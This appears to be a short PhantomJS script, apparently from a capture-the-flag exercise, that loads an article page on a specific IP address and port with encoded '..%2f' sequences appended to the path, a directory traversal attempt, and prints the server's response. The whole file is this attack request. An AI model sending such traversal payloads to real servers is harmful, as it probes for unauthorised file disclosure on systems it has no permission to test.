var page = require('webpage').create();
page.open('http://39.107.33.96:20000/index.php/view/article/30586/..%%2f..%%2f/', function (status,r) {
    console.log("Status: " + status);
    if (status === "success") {
        console.log(r)
        console.log("emmmmm");
    }
    phantom.exit();
});